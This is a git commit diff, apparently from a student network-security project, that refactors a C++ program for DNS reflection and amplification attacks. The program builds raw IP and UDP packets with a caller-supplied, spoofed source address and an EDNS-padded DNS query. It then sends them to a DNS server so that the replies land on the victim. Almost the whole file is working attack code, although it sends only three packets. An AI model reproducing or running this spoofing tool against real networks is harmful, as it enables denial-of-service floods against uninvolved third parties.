d0a84ecf859947242f89a748d9182538873bf6b7
Chilin Ubuntu 20.04 <sky707070.cv07@nctu.edu.tw>
2021-03-17 19:14:13 +0800

    code refactoring🚀

--- Project1-DNS-Reflection-and-Amplification-Attacks/src/attck.cpp
+++ Project1-DNS-Reflection-and-Amplification-Attacks/src/attck.cpp
@@ -1,45 +1,47 @@
-#include <unistd.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <iostream>
+#include <iomanip>
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#include<memory.h>
-#include<stdlib.h>
+#include <memory.h>
+#include <unistd.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h> // sockaddr_ll
-#include<arpa/inet.h>
-#include<netinet/if_ether.h>
-#include<iomanip>
-#include<iostream>
+#include <arpa/inet.h>
+#include <netinet/if_ether.h>
 
-// The packet length
-#define PCKT_LEN 100
+#define BUFF_LEN 100
 
 struct UDP_PSD_Header{
 	u_int32_t src;
 	u_int32_t des;
 	u_int8_t  mbz;
-	u_int8_t ptcl;
+	u_int8_t  ptcl;
 	u_int16_t len;
 };
 
-unsigned short csum(unsigned short *buf, int nwords){ 
+// unsigned short csum(unsigned short *buf, int nwords){ 
+// 	unsigned long sum;
+// 	for (sum = 0; nwords > 0; nwords--){
+// 		sum += *buf++;
+// 	}
+// 	sum = (sum >> 16) + (sum & 0xffff);
+// 	sum += (sum >> 16);
+// 	return (unsigned short)(~sum);
+// }
+
+unsigned short checksum(unsigned short *buff, int _16bitword){
 	unsigned long sum;
-	for (sum = 0; nwords > 0; nwords--)
-	{
-		sum += *buf++;
-	}
-	sum = (sum >> 16) + (sum & 0xffff);
+	for (sum = 0; _16bitword > 0; _16bitword--)
+		sum += htons(*(buff)++);
+	sum = ((sum >> 16) + (sum & 0xFFFF));
 	sum += (sum >> 16);
 	return (unsigned short)(~sum);
 }
 
-
-// Source IP, source port, target IP, target port from the command line arguments
 int main(int argc, char *argv[]){
-	int sd;
-	char buffer[PCKT_LEN] ;
-	//查詢www.chongfer.cn的DNS報文
 
 	// unsigned char DNS[] = { 0xd8, 0xcb , 0x01, 0x00, 0x00, 0x01, 0x00 ,0x00,
 	// 	0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
@@ -48,110 +50,93 @@ int main(int argc, char *argv[]){
 	// 	0x01 };
 
 	unsigned char DNS[] = { 0xda, 0x72, 0x01, 0x00, 0x00, 0x01,
-	0x00,0x00,0x00,0x00,0x00,0x01,0x03,0x77,0x77,0x77,0x06,0x67,0x6f,0x6f,0x67,0x6c,
-	0x65,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x29,0x02,0x00,0x00,
-	0x00,0x00,0x00,0x00,0x00
+		0x00,0x00,0x00,0x00,0x00,0x01,0x03,0x77,0x77,0x77,0x06,0x67,0x6f,0x6f,0x67,0x6c,
+		0x65,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x29,0x02,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00
 	};
 
-	struct iphdr *ip = (struct iphdr *) buffer;
-	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
-	// Source and destination addresses: IP and port
-	struct sockaddr_in din;
-	int  one = 1;
-	const int *val = &one;
-	//快取清零
-	memset(buffer, 0, PCKT_LEN);
-
 	if (argc != 4){
-		printf("- Invalid parameters!!!\n");
-		printf("- Usage %s <source hostname/IP> <source port> <target hostname/IP> <target port>\n", argv[0]);
+		// argv must equal to 4
+		printf("Invalid parameters\n");
 		exit(-1);
 	}
 
 	// Create a raw socket with UDP protocol
-	sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-	if(sd<0){
-		perror("socket() error");
+	int sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+	if (sd < 0){
+		perror("create socket filed error\n");
 		exit(-1);
 	}else{
-		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");
+		printf("create socket successfully\n");
 	}
 
-	//IPPROTO_TP說明使用者自己填寫IP報文
-	//IP_HDRINCL表示由核心來計算IP報文的頭部校驗和，和填充那個IP的id 
+	// create send buffer and init it
+	char buffer[BUFF_LEN];
+	memset(buffer, 0, BUFF_LEN);
 
-	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int))){
-		perror("setsockopt() error");
-		exit(-1);
-	}else{
-		printf("setsockopt() is OK.\n");
-	}
+	// construct ip header
+	struct iphdr *ip = (struct iphdr *)buffer;
 
-	// The source is redundant, may be used later if needed
-	// The address family
-	din.sin_family = AF_INET;
-	// Port numbers
-	din.sin_port = htons(53);
-	// IP addresses
-	din.sin_addr.s_addr = inet_addr(argv[3]);
-
-	// Fabricate the IP header or we can use the
-	// standard header structures but assign our own values.
 	ip->ihl = 5;
-	ip->version = 4;//報頭長度，4*32=128bit=16B
-	ip->tos = 0; // 服務型別
-	ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(DNS)));
-	//ip->id = htons(54321);//可以不寫
-	ip->ttl = 64; // hops生存週期
+	ip->version = 4; 
+	ip->tos = 0;	 
+	// ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS)));
+	ip->id = htons(10201);
+	ip->ttl = 64;	   
 	ip->protocol = 17; // UDP
 	ip->check = 0;
-	// Source IP address, can use spoofed address here!!!
 	ip->saddr = inet_addr(argv[1]);
-	// The destination IP address
 	ip->daddr = inet_addr(argv[3]);
 
-	// Fabricate the UDP header. Source port number, redundant
-	udp->source = htons(7);//源埠
-	// Destination port number
-	udp->dest = htons(53);//目的埠
-	udp->len = htons(sizeof(struct udphdr)+sizeof(DNS));//長度
-	//forUDPCheckSum用來計算UDP報文的校驗和用
-	//UDP校驗和需要計算 偽頭部、UDP頭部和資料部分
+	// construct udp header
+	struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
+
+	udp->source = htons(7);
+	udp->dest 	= htons(53);
+	// udp->len = htons(sizeof(struct udphdr)+sizeof(DNS));
+
+	// Filling length of IP header and UDP header
+	ip->tot_len = htons(sizeof(struct iphdr)  + sizeof(struct udphdr) + sizeof(DNS));
+	udp->len 	= htons(sizeof(struct udphdr) + sizeof(DNS));
+
+	printf("ip len : %d\n", ip->tot_len);
+	printf("udp len : %d\n",udp->len);
+
 	char * forUDPCheckSum = new char[sizeof(UDP_PSD_Header) + sizeof(udphdr)+sizeof(DNS)+1];
 	memset(forUDPCheckSum, 0, sizeof(UDP_PSD_Header) + sizeof(udphdr) + sizeof(DNS) + 1);
-	UDP_PSD_Header * udp_psd_Header = (UDP_PSD_Header *)forUDPCheckSum;
-	udp_psd_Header->src = inet_addr(argv[1]);
-	udp_psd_Header->des = inet_addr(argv[3]);
-	udp_psd_Header->mbz = 0;
-	udp_psd_Header->ptcl = 17;
-	udp_psd_Header->len = htons(sizeof(udphdr)+sizeof(DNS));
-	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header), udp, sizeof(udphdr));
-	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header) + sizeof(udphdr), DNS, sizeof(DNS));
-
-	//ip->check = csum((unsigned short *)ip, sizeof(iphdr)/2);//可以不用算
-	//計算UDP的校驗和，因為報文長度可能為單數，所以計算的時候要補0
-	udp->check = csum((unsigned short *)forUDPCheckSum,(sizeof(udphdr)+sizeof(UDP_PSD_Header)+sizeof(DNS)+1)/2);
-
-	setuid(getpid());//如果不是root使用者，需要獲取許可權	
-
-	// Send loop, send for every 2 second for 2000000 count
-	printf("Trying...\n");
-	printf("Using raw socket and UDP protocol\n");
-	// printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
-	std::cout << "Ip length:" << ip->tot_len << std::endl;
-	int count;
-	//將DNS報文拷貝進快取區
-	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
 	
-	for (count = 1; count <= 3; count++){
+	UDP_PSD_Header * udp_psd_Header = (UDP_PSD_Header *)forUDPCheckSum;
+	
+	udp_psd_Header->src  = inet_addr(argv[1]);
+	udp_psd_Header->des  = inet_addr(argv[3]);
+	udp_psd_Header->mbz  = 0;
+	udp_psd_Header->ptcl = 17;
+	udp_psd_Header->len  = htons(sizeof(udphdr)+sizeof(DNS));
+
+	// checksom
+	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header)					, udp, sizeof(udphdr));
+	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header) + sizeof(udphdr)	, DNS, sizeof(DNS));
+
+	udp->check = checksum((unsigned short *)forUDPCheckSum, (sizeof(udphdr) + sizeof(UDP_PSD_Header) + sizeof(DNS)+1)/2);
+
+	// copy dns content to buffer
+	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
+
+	struct sockaddr_in din;
+	din.sin_family 		= AF_INET;
+	din.sin_addr.s_addr = inet_addr(argv[3]);
+	din.sin_port 		= htons(53);
+
+	for (int i = 1; i <= 3; i++){
 		if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0){
-			perror("sendto() error");
-			exit(-1);
+			perror("send error\n");
+			exit(0);
 		}else{
-			printf("Count #%u - sendto() is OK.\n", count);
-			sleep(2);
+			printf("send success, index:%d\n", i);
+			sleep(1);
 		}
 	}
-	// close(sd);
+
+	close(sd);
 	return 0;
 }
